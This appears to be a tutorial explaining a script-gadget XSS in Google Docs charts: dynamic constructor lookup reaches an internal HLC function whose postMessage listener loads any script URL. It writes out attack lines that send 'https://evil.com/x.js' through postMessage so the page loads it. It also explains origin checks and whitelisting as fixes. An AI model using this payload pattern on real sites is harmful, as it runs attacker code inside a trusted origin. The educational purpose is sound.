
Source URL https://youtu.be/aCexqB9qi70
# Understanding the Google Docs Script Gadget XSS

This vulnerability is **not a traditional Cross-Site Scripting (XSS)** vulnerability where an attacker injects `<script>` tags directly into a page.

Instead, it is an example of a **Script Gadget** attack, where an attacker abuses **existing JavaScript code** inside the application to execute arbitrary JavaScript.

---

# Step 1. What is a JavaScript Object?

Suppose a website has the following JavaScript:

```javascript
const Charts = {
    PieChart: function() {
        console.log("Pie chart");
    },

    BarChart: function() {
        console.log("Bar chart");
    }
};
```

Somewhere else in the application, the code does this:

```javascript
let type = "PieChart";

new Charts[type]();
```

### Output

```text
Pie chart
```

Here,

```javascript
Charts[type]
```

is equivalent to

```javascript
Charts["PieChart"]
```

which returns the constructor function.

The `new` keyword then creates an instance of that constructor.

This technique is called **dynamic property lookup** or **dynamic object lookup**.

---

# Step 2. What Google Visualization Was Doing

Google Visualization used a similar mechanism.

Instead of writing:

```javascript
new Charts["PieChart"]();
```

it effectively performed something like this:

```javascript
let className = userInput;

let obj = getObjectByName(className);

new obj();
```

If

```javascript
className = "gviz.chart.PieChart";
```

then

```javascript
getObjectByName(className)
```

returns

```javascript
gviz.chart.PieChart
```

which becomes

```javascript
new gviz.chart.PieChart();
```

to render the chart.

This design is perfectly safe **as long as the input is properly validated**.

---

# Step 3. The Vulnerability

Instead of sending

```text
PieChart
```

the attacker supplied

```text
HLC
```

Assume Google's internal JavaScript contained:

```javascript
window.HLC = function() {
    console.log("JSONP sandbox");
}
```

The application then executed:

```javascript
new HLC();
```

Google expected to instantiate a chart object.

Instead, it instantiated an entirely different internal JavaScript object.

That unexpected object became the **first script gadget**.

---

# Step 4. What Is a Script Gadget?

Think of a script gadget as an existing tool already available inside the application.

Imagine entering a workshop.

Instead of bringing your own hammer, you simply pick up one already lying on the workbench.

A script gadget works the same way.

The attacker does **not inject new JavaScript**.

Instead, they locate an existing function that already performs a dangerous operation.

Example:

```javascript
function DangerousThing() {
    document.body.innerHTML = "<script src='evil.js'></script>";
}
```

If an attacker can somehow trigger

```javascript
new DangerousThing();
```

then they have successfully abused existing application code to execute JavaScript.

---

# Step 5. Why HLC Was Dangerous

The `HLC()` function was **not originally written for attackers**.

It behaved similarly to:

```javascript
function HLC() {

    window.addEventListener("message", function(event){

        let script = document.createElement("script");

        script.src = event.data;

        document.body.appendChild(script);

    });

}
```

The dangerous part is here:

```javascript
script.src = event.data;
```

The code trusted **any value** supplied through `postMessage()`.

---

# Step 6. What is `postMessage()`?

Suppose two browser windows exist.

**Main page**

```text
evil.com
```

**Iframe**

```text
docs.google.com
```

Normally,

```text
evil.com
```

cannot access Google's DOM because browsers enforce the **Same-Origin Policy**.

However, browsers provide a secure communication API called `postMessage()`.

Example:

### Main page

```javascript
iframe.contentWindow.postMessage(
    "hello",
    "*"
);
```

### Inside the iframe

```javascript
window.addEventListener("message", function(e){

    console.log(e.data);

});
```

### Output

```text
hello
```

This API is completely safe **when used correctly**.

---

# Step 7. The Mistake

Google's message handler looked approximately like this:

```javascript
window.addEventListener("message", function(e){

    let s = document.createElement("script");

    s.src = e.data;

    document.body.appendChild(s);

});
```

Now suppose the attacker sends:

```javascript
postMessage(
    "https://evil.com/x.js",
    "*"
);
```

The listener performs:

```javascript
let s = document.createElement("script");

s.src = "https://evil.com/x.js";

document.body.appendChild(s);
```

which is equivalent to adding:

```html
<script src="https://evil.com/x.js"></script>
```

to the page.

The browser downloads

```text
https://evil.com/x.js
```

and executes it **inside the trusted `docs.google.com` origin**.

This is the actual XSS.

---

# Step 8. Why Origin Checking Matters

Every `message` event contains

```javascript
event.origin
```

Example:

```javascript
window.addEventListener("message", function(e){

    console.log(e.origin);

});
```

If the sender is

```text
https://evil.com
```

then

```javascript
e.origin
```

contains

```text
https://evil.com
```

A secure implementation performs an origin check:

```javascript
if (e.origin !== "https://docs.google.com")
    return;
```

Only trusted origins should be allowed.

Google's vulnerable implementation failed to validate the sender.

---

# Step 9. Complete Attack Flow

```text
Attacker
    │
    ▼
Creates Spreadsheet
    │
    ▼
Changes chart option

ui.type = "HLC"

    │
    ▼
Google executes

new HLC();

    │
    ▼
HLC installs

window.addEventListener("message")

    │
    ▼
Attacker embeds spreadsheet

<iframe src="docs.google.com/...">

    │
    ▼
Attacker sends

postMessage(
    "https://evil.com/x.js"
)

    │
    ▼
Message listener receives URL

    │
    ▼
Creates

<script src="https://evil.com/x.js">

    │
    ▼
Browser loads evil.js

    │
    ▼
JavaScript executes as

docs.google.com
```

---

# Step 10. Why This Is Called a Script Gadget

A traditional XSS usually looks like:

```html
<script>alert(1)</script>
```

or

```javascript
eval(userInput);
```

This vulnerability is different.

The attacker never injects JavaScript directly.

Instead:

1. The attacker forces the application to instantiate an existing constructor (`HLC`).
2. That constructor registers a global message listener.
3. The listener dynamically creates a `<script>` element using attacker-controlled data.

The application's **own JavaScript** performs the dangerous operation.

This reuse of legitimate application code is known as a **Script Gadget**.

---

# Step 11. Why Google's Previous Fix Failed

Originally, Google enforced a whitelist similar to:

```javascript
const allowed = [
    "PieChart",
    "BarChart",
    "LineChart"
];

if (!allowed.includes(type))
    return;
```

During a later code refactor, this validation was accidentally removed from one execution path.

As a result,

```javascript
type = "HLC";
```

was accepted again.

The application then executed:

```javascript
new HLC();
```

allowing the attacker to reach the vulnerable message listener.

---

# JavaScript Concepts Required to Understand This Vulnerability

This exploit demonstrates several important JavaScript concepts.

## Objects and Properties

```javascript
obj["name"]
```

---

## Constructors

```javascript
new MyClass()
```

---

## Dynamic Property Access

```javascript
window["HLC"]
```

---

## DOM Manipulation

```javascript
document.createElement("script")
```

---

## Events

```javascript
window.addEventListener()
```

---

## Cross-Document Messaging

```javascript
window.postMessage()
```

---

## Same-Origin Policy

The browser prevents one website from directly accessing another website's DOM.

---

## Origin Validation

```javascript
event.origin
```

Always verify the sender before trusting incoming messages.

---

## Dynamic Script Loading

```javascript
script.src = url;
```

Assigning an attacker-controlled URL to a `<script>` element causes the browser to download and execute external JavaScript.

---

# Key Takeaways

- The vulnerability was **not caused by direct script injection**.
- It resulted from **dynamic constructor resolution** using user-controlled input.
- The attacker abused an internal function (`HLC`) that was never intended to be exposed.
- `HLC` registered an unsafe `postMessage()` listener.
- The listener dynamically created `<script>` elements using attacker-controlled URLs.
- Missing **origin validation** allowed arbitrary websites to trigger the message listener.
- Proper constructor whitelisting and origin verification completely prevented the exploit.